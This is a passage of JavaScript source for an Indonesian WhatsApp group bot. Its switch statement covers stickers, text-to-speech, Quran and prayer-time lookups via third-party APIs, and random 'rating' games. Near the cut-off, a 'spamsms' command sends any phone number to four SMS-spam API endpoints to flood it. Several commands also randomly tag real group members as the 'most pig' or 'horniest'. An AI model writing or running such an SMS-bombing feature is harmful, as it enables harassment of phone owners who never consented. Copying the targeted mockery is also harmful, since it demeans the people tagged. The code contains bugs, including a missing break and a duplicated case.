					///if (!isOwner) return reply(mess.only.ownerB) 
					if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					if (Number(args[0]) === 1) {
					if (isSimi) return reply('*Fitur simi sudah aktif sebelum nya*')
					simi.push(from)
					fs.writeFileSync('./database/json/simi.json', JSON.stringify(simi))
					reply('Sukses mengaktifkan fitur simi di group ini')
					} else if (Number(args[0]) === 0) {
					let offsimi = simi.indexOf(from)
		            simi.splice(offsimi, 1)
					fs.writeFileSync('./database/json/simi.json', JSON.stringify(simi))
					reply('Sukses menonaktifkan fitur simi di group ini')
					} else {
					reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					}
					break
                case 'eventt':
					if (!isGroup) return reply(mess.only.group)
				    if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
					if (args.length < 1) return reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					if (Number(args[0]) === 1) {
					if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
					event.push(from)
					fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
					reply('Sukses mengaktifkan fitur event di group ini')
					} else if (Number(args[0]) === 0) {
					let offevent = event.indexOf(from)
		            event.splice(offevent, 1)
					fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
					reply('Sukses menonaktifkan fitur event di group ini')
					} else {
					reply(`Untuk mengaktifkan ketik ${prefix + command} 1\nUntuk menonaktifkan ketik ${prefix + command} 0`)
					}
					
				case 'memegen':
				        if (!isRegistered) return reply(mess.only.userB)
				        if (isBanned) return reply(mess.only.benned)
				        if (isLimit(sender)) return reply(mess.limituser)
					    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
							reply(mess.wait)
							await sleep(2000)
							reply(mess.error.bug)
							limitAdd(sender)
						} else {
					    	reply(`kirim gambar atau tag gambar dengan caption ${prefix + command} ivan|xxx`)
				        	}   
					break
				case 'stiker': 
				case 'sticker':
				case 's':
				case 'stickergif':
				case 'stikergif':
				case 'sgif':
				        if (!isRegistered) return reply(mess.only.userB)
				        if (isBanned) return reply(mess.only.benned)
				        if (isLimit(sender)) return reply(mess.limituser)
					    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								buffer = fs.readFileSync(ran)
								client.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
								limitAdd(sender)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.wait)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.stick)
							})
							.on('end', function () {
								buffer = fs.readFileSync(ran)
								client.sendMessage(from, buffer, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
								limitAdd(sender)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
							} else {
					    	reply(`Kirim gambar/video/gif dengan caption \n${prefix}sticker (durasi sticker video 1-9 detik)`)
				        	}   
					break
				case'listbahasa':
				    if (!isRegistered) return reply(mess.only.userB)
				    client.sendMessage(from, bahasa(), text, {quoted: mek})
				    break
                case 'tts':
                    if (!isRegistered) return reply(mess.only.userB)
					try{
					if (args.length < 1) return client.sendMessage(from, 'Kode bahasanya mana kak?', text, {quoted: mek})
					gtts = require('./lib/gtts')(args[0])
				    } catch (e) {
					console.log(`Error :`, color(e,'red'))
					reply(`Error! kode bahasa tidak terdaftar.\nKirim ${prefix + command} kode bahasa text\nUntuk list bahasa kirim ${prefix}listbahasa\nContoh ${prefix + command} id hai`)
					}
					if (args.length < 2) return client.sendMessage(from, 'Textnya mana kak?', text, {quoted: mek})
					dtt = body.slice(7)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('Textnya kebanyakan kak')
					: gtts.save(ranm, dtt, function() {
					client.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
			        limitAdd(sender)
					fs.unlinkSync(ranm)
					})
					break
				case 'join':  
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Link nya mana?')
					client.query({
					json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
					})
					reply(`Sukses join!`)
					break
				case 'quran':
					        	if (!isRegistered) return reply(mess.only.userB)
					         	if (isBanned) return reply(mess.only.benned)
						        if (isLimit(sender)) return reply(mess.limituser)
								anu = await fetchJson(`https://api.banghasan.com/quran/format/json/acak`, {method: 'get'})
								quran = `${anu.acak.ar.teks}\n\n${anu.acak.id.teks}\nQ.S ${anu.surat.nama} ayat ${anu.acak.id.ayat}`
								client.sendMessage(from, quran, text, {quoted: mek})
								await limitAdd(sender) 
								break 
						case 'alquran':
						      	if (!isRegistered) return reply(mess.only.userB)
						      	if (isBanned) return reply(mess.only.benned)
						    	if (isLimit(sender)) return reply(mess.limituser)
								if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
								urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${LolApi}`
								quran = await fetchJson(urls)
								result = quran.result
								ayat = result.ayat
								ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
								for (var x of ayat) {
									arab = x.arab
									nomor = x.ayat
									latin = x.latin
									indo = x.indonesia
									ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
								}
								ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
								ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
								ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
								reply(ini_txt)
								break
						case 'hadits': 
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
							if (args.length < 1) return reply(`kitab + nomor nya mana om? contoh: hadits muslim|116`)
							ct = body.slice(8)
							ll1 = ct.split("|")[0];
							ll2 = ct.split("|")[1];
							anu = await fetchJson(`https://olabdev-api.herokuapp.com/api/hadits?kitab=${ll1}&nomor=${ll2}&apikey=OggyBot`)
							teks = `➸ *Name Hadits* : ${anu.result.data.name}\n*➸ Number Hadits :* ${anu.result.data.contents.number}\n*➸ Arab :* ${anu.result.data.contents.arab}\n*➸ Latin :* ${anu.result.data.contents.id}`
							client.sendMessage(from, teks, text, {quoted: mek})
							await limitAdd(sender) 
							break
						case 'doaharian':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
								client.sendMessage(from, doaharian(prefix), text, {quoted: mek})
								await limitAdd(sender) 
								break
						case 'ayatkursi':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
								client.sendMessage(from, ayatkursi(prefix), text, {quoted: mek})
								await limitAdd(sender) 
								break
						case 'niatsholat':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
								client.sendMessage(from, niatsholat(prefix), text, {quoted: mek})
								await limitAdd(sender) 
								break
						case 'bacaansholat':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
								client.sendMessage(from, bacaansholat(prefix), text, {quoted: mek})
								await limitAdd(sender) 
								break
						case 'asmaulhusna':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
								client.sendMessage(from, asmaulhusna(prefix), text, {quoted: mek})
								await limitAdd(sender) 
								break
						case 'tahlil':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
								client.sendMessage(from, tahlil(prefix), text, {quoted: mek})
								await limitAdd(sender) 
								break
						case 'kisahnabi': 
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
							if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
								query = args.join(" ")
								get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${LolApi}`)
								get_result = get_result.result
								ini_txt = `Name : ${get_result.name}\n`
								ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
								ini_txt += `Umur : ${get_result.age}\n`
								ini_txt += `Tempat : ${get_result.place}\n`
								ini_txt += `Story : \n${get_result.story}`
								reply(ini_txt)
							await limitAdd(sender) 
							break
						case 'jadwalsholat': 
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
							if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
								daerah = args.join(" ")
								get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${LolApi}`)
								get_result = get_result.result
								ini_txt = `Wilayah : ${get_result.wilayah}\n`
								ini_txt += `Tanggal : ${get_result.tanggal}\n`
								ini_txt += `Sahur : ${get_result.sahur}\n`
								ini_txt += `Imsak : ${get_result.imsak}\n`
								ini_txt += `Subuh : ${get_result.subuh}\n`
								ini_txt += `Terbit : ${get_result.terbit}\n`
								ini_txt += `Dhuha : ${get_result.dhuha}\n`
								ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
								ini_txt += `Ashar : ${get_result.ashar}\n`
								ini_txt += `Maghrib : ${get_result.maghrib}\n`
								ini_txt += `Isya : ${get_result.isya}`
								reply(ini_txt)
							await limitAdd(sender) 
							break 
							case 'quransurah':
								if (!isRegistered) return reply(mess.only.userB)
								if (isBanned) return reply(mess.only.benned)
								if (isLimit(sender)) return reply(mess.limituser)
						reply(mess.wait)
						surah = `${body.slice(12)}`
						anu = await fetchJson(`https://api.zeks.me/api/quran?no=${surah}&apikey=${ZeksApi}`)
						quran = `Surah Al-Qur\`an Nomer: *${surah}*\nSurah: *${anu.surah}*\nDiturunkan Dikota: *${anu.type}*\nJumlah Ayat: *${anu.jumlah_ayat}*\n\n*${anu.ket}\n=============================\n`
						for (let surah of anu.ayat) {
						quran += `${surah.number}\n${surah.text}\n${surah.translation_id}\n=====================\n`
						}
						reply(quran.trim())
						await limitAdd(sender) 
						break 
						case 'listsurah':
							if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
								get_result = await fetchJson(`http://api.lolhuman.xyz/api/quran?apikey=${LolApi}`)
								get_result = get_result.result
								ini_txt = 'List Surah:\n'
								for (var x in get_result) {
									ini_txt += `${x}. ${get_result[x]}\n`
								}
								reply(ini_txt)
								await limitAdd(sender) 
								break
						case 'quranaudio':
							if (!isRegistered) return reply(mess.only.userB)
							if (isBanned) return reply(mess.only.benned)
							if (isLimit(sender)) return reply(mess.limituser)
								if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
								surah = args[0]
								ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${LolApi}`)
								client.sendMessage(from, ini_buffer, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })
								await limitAdd(sender) 
								break
								case 'oxo': 
								case 'xox': 
								                  
								if (!isRegistered) return reply(mess.only.userB)
								if (isLimit(sender)) return
								await limitAdd(sender)
								const somtoyy = sotoyy[Math.floor(Math.random() * sotoyy.length)]
								client.sendMessage(from, `[  🎰 | X O X ]\n-----------------\n\n*${somtoyy}*\n\n-----------------\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan Huruf O 3 Huruf Berarti Anda Menang\n\nContoh : O : O : O<=====`, text, { quoted: mek })
								break
								 case 'cantik':
            case 'tercantik':
				case 'cantik':
				if (!isRegistered) return reply(mess.only.userB)
				if (isLimit(sender)) return
				if (!isGroup) return reply(`GROUP ONLY`)
				await limitAdd(sender)
					membr = []
					const mes = groupMembers
					const msk = groupMembers
					const siaps = mes[Math.floor(Math.random() * mes.length)]
					const sips = pushname[Math.floor(Math.random() * msk.length)]
					teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
					membr.push(siaps.jid)
					mentions(teks, membr, true)
					break
                case 'ganteng':
                case 'terganteng':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					membr = []
					const nus = groupMembers
					const msl = groupMembers
					const siapss = nus[Math.floor(Math.random() * nus.length)]
					const sipss = pushname[Math.floor(Math.random() * msl.length)]
					teks = `*Yang Paling Ganteng Disini Adalah :* @${siapss.jid.split('@')[0]}`
					membr.push(siapss.jid)
					mentions(teks, membr, true)
					break
                case 'beban':
                case 'terbeban':
					if (!isRegistered) return reply(mess.only.userB)
								if (isLimit(sender)) return
								if (!isGroup) return reply(`GROUP ONLY`)
								await limitAdd(sender)
					membr = []
					const nusq = groupMembers
					const mslq = groupMembers
					const siapssq = nusq[Math.floor(Math.random() * nusq.length)]
					const sipssq = pushname[Math.floor(Math.random() * mslq.length)]
					teks = `*Yang Paling Beban Disini Adalah :* @${siapssq.jid.split('@')[0]}`
					membr.push(siapssq.jid)
					mentions(teks, membr, true)
					break
                case 'babi':
                case 'terbabi':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					membr = []
					const nusw = groupMembers
					const mslw = groupMembers
					const siapssw = nusw[Math.floor(Math.random() * nusw.length)]
					const sipssw = pushname[Math.floor(Math.random() * mslw.length)]
					teks = `*Yang Paling Babi Disini Adalah :* @${siapssw.jid.split('@')[0]}`
					membr.push(siapssw.jid)
					mentions(teks, membr, true)
					break
			case 'tod':
				if (!isRegistered) return reply(mess.only.userB)
				if (isLimit(sender)) return
				if (!isGroup) return reply(`GROUP ONLY`)
				await limitAdd(sender)
					membr = []
					const mesyy = groupMembers
					const mskyy = groupMembers
					const siapsyy = mesyy[Math.floor(Math.random() * mesyy.length)]
					const sipsyy = pushname[Math.floor(Math.random() * mskyy.length)]
					teks = `*Truth or Dare*\n*Yok Giliran Kak* @${siapsyy.jid.split('@')[0]}`
					membr.push(siapsyy.jid)
					mentions(teks, membr, true)
					break
             case 'gantengcek':
			 case 'cekganteng':
			    	if (!isRegistered) return reply(mess.only.userB)
			    	if (isLimit(sender)) return
			     	if (!isGroup) return reply(`GROUP ONLY`)
			    	await limitAdd(sender)
					ganteng = body.slice(12)
					const gan =['10%','30%','20%','40%','50%','60%','70%','62%','74%','83%','97%','100%','29%','94%','75%','82%','41%','39%']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					client.sendMessage(from, 'Cek ganteng bang '+ganteng+'\n\nJawaban : '+ teng +'', text, { quoted: mek })
					break
				case 'cantikcek':
				case 'cekcantik':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					cantik = body.slice(11)
					if (args.length < 1) return reply(`Yg mau di cek siapa kak?\nContoh ${prefix + command} nabila`)
					const can =['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
					const tik = can[Math.floor(Math.random() * can.length)]
					client.sendMessage(from, 'Pertanyaan : Cantik cek kakak '+cantik+'\n\nPersen Kecantikan : '+ tik +'', text, { quoted: mek })
					break
                case 'apakah':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					apakah = body.slice(1)
					const apakahh = ["Ya","Tidak","Ga tau","Mbuh su","Gatau mbuh mumet ngadepi pertanyaanmu","Takon yangmu ae kono lho su"]
					const kah = apakahh[Math.floor(Math.random() * apakahh.length)]
					client.sendMessage(from, 'Pertanyaan : '+apakah+'\n\nJawaban : '+ kah, text, { quoted: mek })
					break 
				case 'bagaimanakah':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Cari Aja Sendiri','Tanya aja sama rumput yang bergoyang','Bawel amat si','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					client.sendMessage(from, 'Pertanyaan : '+bagaimanakah+'\n\nJawaban : '+ mana, text, { quoted: mek })
					await limitAdd(sender)
					break
                case 'sagnecek':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					client.sendMessage(from, 'Pertanyaan : '+sange+'\n\nJawaban : '+ nge+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
				case 'stickerpatrick':
				case 'stikerpatrick':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
						if (!isPremium) return reply(mess.only.premium)
						await limitAdd(sender)
						anu = await getBuffer(`http://api.lolhuman.xyz/api/sticker/patrick?apikey=${LolApi}`)
						client.sendMessage(from, anu, sticker, {quoted:mek})
						break
				case 'stickeranjing':
				case 'stikeranjing':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
						if (!isPremium) return reply(mess.only.premium)
						await limitAdd(sender)
						anu = await getBuffer(`http://api.lolhuman.xyz/api/sticker/anjing?apikey=${LolApi}`)
						client.sendMessage(from, anu, sticker, {quoted:mek})
						break
				case 'stickerbucin':
				case 'stikerbucin':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
						if (!isPremium) return reply(mess.only.premium)
						await limitAdd(sender)
						anu = await getBuffer(`http://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${LolApi}`)
						client.sendMessage(from, anu, sticker, {quoted:mek})
						break
				case 'gawrgura':
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)
						if (!isPremium) return reply(mess.only.premium)
						await limitAdd(sender)
						anu = await getBuffer(`http://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${LolApi}`)
						client.sendMessage(from, anu, sticker, {quoted:mek})
						break	
				case 'panjangttd':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					pnjngttd = body.slice(1)
					const pnjng =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const ttdny = pnjng[Math.floor(Math.random() * pnjng.length)]
					client.sendMessage(from, 'Pertanyaan : *'+pnjngttd+'*\n\nJawaban : '+ ttdny+'cm', text, { quoted: mek })
					await limitAdd(sender)
					break
				case 'rate':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					rate = body.slice(1)
					ratee = ["100%","95%","90%","85%","80%","75%","70%","65%","60%","55%","50%","45%","40%","35%","30%","25%","20%","15%","10%","5%"]
					const te = ratee[Math.floor(Math.random() * ratee.length)]
					client.sendMessage(from, 'Pertanyaan : '+rate+'\n\nJawaban : '+ te+'', text, { quoted: mek })
					break 
				case 'watak':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					watak = body.slice(1)
					wa =["penyayang","pemurah","Pemarah","Pemaaf","Penurut","Sangean","Baik","baperan","Baik Hati","penyabar","Uwu","top deh, pokoknya","Suka Membantu"]
					const tak = wa[Math.floor(Math.random() * wa.length)]
					client.sendMessage(from, 'Pertanyaan : '+watak+'\n\nJawaban : '+ tak, text, { quoted: mek })
					break 
				case 'hobby':
				case 'hobi':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					hobby = body.slice(1)
					hob =["Memasak","Membantu Atok","Open BO","Mabar","Nobar","Sosmed an","Membantu Orang lain","Nonton Anime","Nonton Drakor","Naik Motor","Nyanyi","Menari","Bertumbuk","Menggambar","Foto fotoan Ga jelas","Maen Game","Berbicara Sendiri"]
					const by = hob[Math.floor(Math.random() * hob.length)]
					client.sendMessage(from, 'Pertanyaan : '+hobby+'\n\nJawaban : '+ by, text, { quoted: mek })
					break 
				case 'bisakah':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					bisakah = body.slice(1)
					const bisakahh = ["Bisa","Tidak Bisa","Ga tau"]
					const keh = bisakahh[Math.floor(Math.random() * bisakahh.length)]
					client.sendMessage(from, 'Pertanyaan : '+bisakah+'\n\nJawaban : '+ keh, text, { quoted: mek })
					break 
				case 'kapankah':
					if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return
					if (!isGroup) return reply(`GROUP ONLY`)
					await limitAdd(sender)
					kapankah = body.slice(1)
					const kapankahh = ["1 Minggu lagi","1 Bulan lagi","1 Tahun lagi","100 tahun lagi","gatau","2030","1 Jam lagi","1 Menit lagi"]
					const koh = kapankahh[Math.floor(Math.random() * kapankahh.length)]
					client.sendMessage(from, 'Pertanyaan : '+kapankah+'\n\nJawaban : '+ koh, text, { quoted: mek })
					break 
				case 'pakboycek': 
				case 'fuckboycek': 
                    N = `KE *PAKBOYZ* KAMU\n`
                    N += `ADALAH : *${ixbteam3}${ixbteam4}%* 😏`
                    reply(N)
                    break 
                case 'pakgirlcek':	
				case 'fuckgirlcek':
                    N = `KE *PAKGILR* KAMU\n`
                    N += `ADALAH : *${ixbteam3}${ixbteam4}%* 😏`
                    reply(N)
                    break             
                case 'sangecek':
                    N = `JIWA *SANGE* KAMU\n`
                    N += `ADALAH : *${ixbteam3}${ixbteam4}%* 🤤`
                    reply(N)
                    break	
				case 'sange': 
				case 'tersange':  
					if (!isRegistered) return reply(mess.only.userB)
				    if (isLimit(sender)) return
				    await limitAdd(sender)
				    if (!isGroup) return reply(`GROUP ONLY`)
				    jds = []
				    const A1 = groupMembers
					const B1 = groupMembers
				    const C1 = A1[Math.floor(Math.random() * A1.length)]
			        D1 = `Yang *tersange* disini adalah @${C1.jid.split('@')[0]}`                  
				    jds.push(C1.jid)
				    mentions(D1, jds, true)
				    break  
				case 'terbucin':  
					if (!isRegistered) return reply(mess.only.userB)
				    if (isLimit(sender)) return
				    await limitAdd(sender)
				    if (!isGroup) return reply(`GROUP ONLY`)
				    jds = []
				    const A2 = groupMembers
					const B2 = groupMembers
				    const C2 = A2[Math.floor(Math.random() * A2.length)]
				    D2 = `Yang *terbucin* disini adalah @${C2.jid.split('@')[0]}`                  
				    jds.push(C2.jid)
				    mentions(D2, jds, true)
				    break
				case 'wait':				
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					reply(ind.wait())
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					media = await client.downloadMediaMessage(encmedia)
					await wait(media).then(res => {
					client.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
					}).catch(err => {
					reply(err)
					})
					} else {
					reply(ind.ocron())
					}
					await limitAdd(sender)
					break
			case 'grupbot':
			case 'ixbgrup':
			case 'ixbgroup':
			case 'groupbot':
					reply(`Halo ${pushname}, https://chat.whatsapp.com/JygzAfXagia87Puy9hHjmz`)
                    break 

////OTHERMENU 
case 'timer':
	if (args[1]=="detik") {var timer = args[0]+"000"
	} else if (args[1]=="menit") {var timer = args[0]+"0000"
	} else if (args[1]=="jam") {var timer = args[0]+"00000"
	} else {return reply("*pilih:*\ndetik\nmenit\njam")}
	setTimeout( () => {
	reply("Waktu habis")
	}, timer)
	break
case 'ssweb':
    	if (!isRegistered) return reply(mess.only.userB)
	    if (isBanned) return reply(mess.only.benned)
	    if (isLimit(sender)) return reply(mess.limituser)
		if (args.length < 1) return reply('Urlnya mana gan?')
		reply(mess.wait)
		ini_link = args[0]
		ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ssweb?apikey=${LolApi}&url=${ini_link}`)
		await client.sendMessage(from, ini_buffer, image, { quoted: mek })
		await limitAdd(sender)
		break
	case 'sswebfull':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		if (args.length < 1) return reply('Urlnya mana gan?')
		reply(mess.wait)
		ini_link = args[0]
		ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/sswebfull?apikey=${LolApi}&url=${ini_link}`)
		await client.sendMessage(from, ini_buffer, image, { quoted: mek })
		await limitAdd(sender)
		break
	case 'shortlink':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		if (args.length < 1) return reply('Urlnya mana gan?')
		reply(mess.wait)
		try {
			ini_link = args[0]
			anu = await axios.get(`https://tinyurl.com/api-create.php?url=${ini_link}`)
			reply(`${anu.data}`)
			} catch (e) {
			emror = String(e)
			reply(`${e}`)
			}
		await limitAdd(sender)
		break
	case 'tourl':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
     	if (!isPremium) return reply(mess.only.premium)
        boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
        reply(mess.wait)
		owgi = await client.downloadMediaMessage(boij)
        res = await upload(owgi)
        reply(res)
        break
	case 'spamsms':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
     	if (!isPremium) return reply(mess.only.premium)
		if (args.length == 0) return reply(`Example: ${prefix + command} 08303030303030`)
		reply(mess.wait)
		nomor = args[0]
		await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=${LolApi}&nomor=${nomor}`)
		await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=${LolApi}&nomor=${nomor}`)
		await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=${LolApi}&nomor=${nomor}`)
		await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=${LolApi}&nomor=${nomor}`)
